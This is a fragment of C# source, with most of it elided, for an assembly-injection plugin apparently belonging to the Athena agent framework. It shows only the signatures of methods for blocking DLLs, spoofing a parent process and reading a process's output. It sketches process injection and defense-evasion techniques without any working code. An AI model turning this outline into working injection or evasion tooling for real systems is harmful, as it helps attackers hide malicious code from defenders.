...
using inject_assembly.Techniques;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using static inject_assembly.Native;

namespace inject_assembly
{
    public class InjectAssembly : AthenaPlugin
    {
        ...
        static bool AddBlockDLLs(ref STARTUPINFOEX siEx, ref IntPtr lpSize)
        {
        ...
        static bool AddSpoofParent(int parentProcessId, ref STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
        {
        ...
        static bool GetProcessOutput(IntPtr lpValueProc, IntPtr hStdOutRead, PROCESS_INFORMATION pInfo, STARTUPINFOEX siEx, string task_id)
        {
            try
            {
